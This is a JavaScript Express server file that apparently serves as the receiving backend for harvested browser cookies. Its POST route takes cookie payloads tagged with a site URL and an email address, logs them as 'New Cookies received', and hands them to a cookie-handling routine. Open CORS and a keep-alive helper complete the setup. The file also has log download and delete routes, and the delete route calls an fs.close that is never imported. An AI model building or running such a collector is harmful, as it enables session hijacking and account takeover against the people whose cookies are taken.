const express = require("express");
const utils = require('./utils');
const logger = require("./logger");
const cors = require("cors");
const { unlinkSync, open } = require("fs");

const app = express();

const PORT = process.env.PORT || 3000;

let RUNNING = 0;

if (RUNNING === 0) { utils.keepTheServerRunning(); RUNNING = 1; };

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));
app.use(cors());

app.get("/", async (req, res) => {
    res.send({ status: "Server is Up and Running!" });
});

app.post("/", (req, res) => {
    logger.log(2, `New Cookies received: ${req.body.url}, ${req.body.email}`);
    utils.handleCookies(req.body);
    res.json("Data recieved successfully!");

});

app.get("/download_log_file", (req, res) => {
    const filename = req.query.filename;

    if (!filename) return res.status(400).send({ error: "Missing file path in query params." });
    if (!["errors", "info", "warnings"].includes(filename)) return res.status(400).send({ error: "This provided file is not available." });

    res.download(`./logs/${filename}.log`);
});

app.get("/delete_log_file", (req, res) => {
    const filename = req.query.filename;

    if (!filename) return res.status(400).send({ error: "Missing file path in query params." });
    if (!["errors", "info", "warnings"].includes(filename)) return res.status(400).send({ error: "This provided file is not available." });

    try {
        unlinkSync(`./logs/${filename}.log`);

        open(`./logs/${filename}.log`, "wx", function (err, fd) {
            // handle error
            fs.close(fd, function (err) { /*handle error*/ });
        });

        res.send({ status: "success" });
    } catch (error) {
        res.status(500).send({ error: error });
    };
    
})

app.listen(PORT, () => {
    logger.log(2, `Server is running on port ${PORT}`);
});
